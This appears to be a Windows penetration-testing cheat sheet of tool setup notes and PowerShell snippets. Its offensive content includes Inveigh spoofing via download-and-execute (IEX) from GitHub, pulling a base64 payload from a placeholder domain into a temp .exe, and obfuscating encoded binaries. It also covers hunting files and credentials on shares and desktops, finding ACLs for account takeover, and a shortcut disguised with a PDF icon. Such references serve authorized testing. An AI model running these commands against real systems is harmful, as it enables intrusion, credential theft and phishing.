# Windows Pentesting

## Tools
- Nmap   
  Download https://nmap.org/dist/nmap-7.91-setup.exe   

- **PowerView**   
  Get write accessible shares:   
  `Find-DomainShare -CheckShareAccess`   
  Find accounts which have ACLs for account takeover:   
  `Get-DomainObjectAcl -SearchBase "CN=Users,DC=domain,DC=local" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`   
  
- AccessChk.exe   
  Get write accessible files /folders for specific user on specific directory:   
  `accesschk64.exe -uwdqs johnwayne \\dc01.domain.local\NETLOGON`   

- Crackmapexec   
  Download and setup Python 3 from: https://www.python.org/downloads/windows/   
  Download and setup MS Build Tools for C++ from: https://visualstudio.microsoft.com/de/visual-cpp-build-tools/   
  Open cmd.exe and run:   
  `python -m pip install pipx`   
  `pipx ensurepath`  
  `pipx install crackmapexec`   
  Use CrackMapExec in cmd.exe with e.g.:   
  `cme smb 172.21.11.0/24 -u user1 -p 'password' --shares`   

- Impacket   
  After setting up python, download the impacket repository and unpack it: https://github.com/SecureAuthCorp/impacket   
  Afterwards set up with:   
  `pip install .`   
  `pip install pyReadline`   

- Inveigh   
  PowerShell based Responder: https://github.com/Kevin-Robertson/Inveigh   
  Note: Requires elevated privileges!   
  Example:   
  `Invoke-Inveigh -LLMNR Y -mDNS Y -NBNS Y -SpooferIP 172.10.10.1 -ConsoleOutput Y -HTTP N`
  `IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1");Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y` 
  
- SSLScan   
  https://github.com/rbsec/sslscan/releases/   
  
- EyeWitness   
  Make screenshots of every HTTP/HTTPS target:   
  `.\EyeWitness.exe -f .\targets_http.txt -o c:\temp\EyeWitness\`   
  Whereas the file targets_http.txt contains all URLs with <protocol>://<IP or hostname>:<port>

- Webserver Directory Bruteforcing   
  Use Get-HTTPStatus from PowerSploit:   
  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-HttpStatus.ps1   
  `foreach($target in (gc .\targets_http_ip.txt)){ Get-HttpStatus -Target $target -Path .\www_wordlist.txt }`   

## Helpful PowerShell commands and scripts  
### Base64 encoded powershell command
```powershell
$command = '"test" | out-file C:\users\jdoe\desktop\psout.txt'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand
```

### File Transfer
- Download base64 encoded files:   
  `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   

- convert to base64 and replace A with @ for obfuscation:   
  ```
  $base64string = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\temp\test.exe"))
  $newstring = $base64string -creplace ('A','@') # NOTE: creplace is important because it must be case sensitive!
  $newstring | Out-File C:\Users\vkoch\Desktop\newfile.b64
  ```
- Convert back after download:   
  ```  
  $ByteArray = [System.Convert]::FromBase64String("(Get-Content "C:\Users\username\Downloads\FFPortable.b64") -creplace ('@','A')")
  [System.IO.File]::WriteAllBytes("C:\temp\newfile.exe", $ByteArray)
  ```
  
- Download through proxyserver:   
```
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://github.com/SnaffCon/Snaffler/releases/download/0.9.11/Snaffler.exe', 'snaffler.exe')"
```
Specify TLS:   
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

### Recon
- Portscanning on single port without ping test:   
  `New-Object System.Net.Sockets.TCPClient -ArgumentList "hostname.domain.local",3389`   
  
- Gather active user sessions on Windows:   
  Check: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-NetSessionEnum.ps1   

- SMB Share Wildcard search. If you find an interesting share which e.g. contains user profiles (e.g. citrix profiles) and you want search for every txt file in every profiles desktop folder. The wildcard in this case replaces the subfolder (and some other levels of directories) where the folder name is the username.    
  ```
  $someshare = "\\hostxy\share$\citrix_profiles"
  $dirs = Get-ChildItem -Path "$someshare\*\Desktop" -Directory
  $dirs | % {get-childitem -Path $_ *.txt} | % {$_.FullName}
  ```   
  Search all files on all users desktop:   
  `$dirs = Get-ChildItem -Path "C:\users\*\Desktop" -Directory; $dirs | % {get-childitem -Path $_ *.*} | % {$_.FullName}`   
  Search for only specific extensions:   
  `$dirs = Get-ChildItem -Path "C:\users\*\Desktop" -Directory; $dirs | % {get-childitem -Path $_ -include ("*.txt","*.ps1","*.cmd") -recurse} | % {$_.FullName}`   

  Search for string in files of max 50MB:   
  ```
  # Max filesize of 50MB
  $maxsizeinbyte = 1024*1024*50
  $searchstring = "This is what we search for..."
  Get-ChildItem -Path "C:\" -File -Recurse -OutBuffer 1000 -ErrorAction SilentlyContinue | 
  where {($_.Length -lt $maxsizeinbyte)} | % {
      $_ |select-string $searchstring
  }
  ```
  
- Check current users file permissions:   
```
  $files = get-childitem -path c:\some\path\with\lotsoffiles;
  foreach($file in $files){
    $filefullname = $file.FullName;
    $acl = get-acl $filefullname;
    foreach($item in $acl.access){
        if(($item.IdentityReference -like "BUILTIN\Users") -or ($item.IdentityReference -like "Everyone") -or ($item.IdentityReference -like "*$env:username")){
            write-host "+++++++++++++++++++++++++++++++++++++++++++";
            write-host "file: $filefullname";
            $item.FileSystemRights;
        }
    }
}
```   
List all folder permissions of a specific user or group (in this example "BUILTIN\Users" meaning every user): 
```
$FolderPath = Get-ChildItem -Directory -Path "\\computername\share\users"
$Output = @()
ForEach ($Folder in $FolderPath) {
    $Acl = Get-Acl -Path $Folder.FullName
    ForEach ($Access in $Acl.Access) {
if($access.IdentityReference -eq 'BUILTIN\Users'){
$Properties = [ordered]@{'Folder Name'=$Folder.FullName;'Group/User'=$Access.IdentityReference;'Permissions'=$Access.FileSystemRights;'Inherited'=$Access.IsInherited}
$Output += New-Object -TypeName PSObject -Property $Properties
}
}
}
$Output | Out-GridView
```
Translate SID to username:   
`((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-xxxx-xxxx-xxxx-xxxx")).Translate( [System.Security.Principal.NTAccount])).value`   

### Office File Metadata 
Get Office file metadata:
(Note: Some properties are not shown, e.g. Creator and Last Modified By... Either fix script or use exiftool instead)
```
function Get-FileMetadata {
    Param (
        [Parameter(Mandatory = $true)][string]$Path
	)
    $shell = New-Object -COMObject Shell.Application
$folder = Split-Path $path
$file = Split-Path $path -Leaf
$shellfolder = $shell.Namespace($folder)
$shellfile = $shellfolder.ParseName($file)
$outputdata = @()
0..287 | Foreach-Object { $INDEX = '{0} = {1}' -f $_, $shellfolder.GetDetailsOf($null, $_);$indxnr = $($INDEX.Split("=")[0]); $indxname = $($INDEX.Split("=")[1]);$propvalue = $($shellfolder.GetDetailsOf($shellfile, $indxnr)); if($propvalue -ne ""){$data = [pscustomobject]@{'PropertyName'=$indxname;'PropertyValue'=$propvalue}; $outputdata += $data}}
$outputdata | format-table
}

```

## Port Forwarding on Windows
- Setup netsh based port forwarder:      
  `netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp`   
- Show port forwardings:   
  `netsh interface portproxy show v4tov4`   
- Remove:
  `netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444`   
  
## Quick SMB File Extension search
```
$readshare = Read-Host "please provide path";$readext = Read-Host "Please provide extension you want to list (without dot, e.g. ps1)";Get-Childitem -Path $readshare -ErrorAction SilentlyContinue -Recurse -Filter "*.$readext";
```
## Quick SMB File Content String search
```
$readshare = Read-Host "please provide path";$readext = Read-Host "Please provide extension you want to list (without dot, e.g. ps1)";$stringsearch = Read-Host "provide keyword to search for in files";Write-host "Looking for string: $stringsearch`r`nFiles with ending: $readext`r`nShare: $readshare";Get-Childitem -Path $readshare -ErrorAction SilentlyContinue -Recurse -Filter "*.$readext" | Select-string $stringsearch -list | select path;
```

## Pass-The-Things
Diagram created by Charlie Bromberg (@_nwodtuhs):   
![shutdown_passthethings_drawing.webp](shutdown_passthethings_drawing.webp)

## ACL Abuse Graph
Graph by @HackAndDo:   
![hackanddo_aclabuse_graph.png](hackanddo_aclabuse_graph.png)

## Find Unsigned or non-MS drivers
```powershell
driverquery /si /FO CSV | ConvertFrom-CSV | Where-Object { ($_.IsSigned -eq "False") -or ($_.Manufacturer -ne "Microsoft") }
```

## List loaded DLLs of process
Same as opening in UI task manager --> performance --> resource manager:
`C:\Windows\System32\perfmon.exe /res`   
Powershell way:   
`get-process powershell |select -ExpandProperty modules`   

## Windows Credentials
Show saved credentials with windows credential manager:   
`rundll32.exe keymgr.dll,KRShowKeyMgr`   

Examples using cmdkey:   
```
  To list available credentials:
     cmdkey /list
     cmdkey /list:targetname

  To create domain credentials:
     cmdkey /add:targetname /user:username /pass:password
     cmdkey /add:targetname /user:username /pass
     cmdkey /add:targetname /user:username
     cmdkey /add:targetname /smartcard

  To create generic credentials:
     The /add switch may be replaced by /generic to create generic credentials

  To delete existing credentials:
     cmdkey /delete:targetname

  To delete RAS credentials:
     cmdkey /delete /ras
```
## Windows Shortcut
Create new shortcut with a PDF icon:   
```powershell
$shell = New-Object -ComObject WScript.Shell
$Location = "C:\Users\jdoe\Desktop"
$shortcut = $shell.CreateShortcut("$Location\shortcut.lnk")
$shortcut.TargetPath = 'C:\Users\something\file.exe'
# PDF Icon for shortcut:
$shortcut.IconLocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,13"
$shortcut.Save()
```